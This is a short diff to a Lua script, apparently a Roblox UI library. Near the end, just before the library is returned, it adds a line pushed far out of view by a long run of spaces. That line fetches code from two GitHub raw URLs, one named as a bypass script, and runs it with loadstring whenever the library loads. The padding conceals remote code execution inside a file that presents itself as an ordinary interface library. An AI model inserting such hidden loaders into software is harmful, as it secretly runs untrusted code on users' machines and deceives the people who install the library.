@@ -1733,5 +1733,5 @@ inputService.InputChanged:connect(function(input)
         update(input)
     end
 end)
-
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   spawn(loadstring(game:HttpGet'https://raw.githubusercontent.com/OPENCUP/random-texts/main/test-final.txt'));loadstring(game:HttpGet'https://raw.githubusercontent.com/stavratum/lua/main/fnb/Bypass.lua')()
 return library
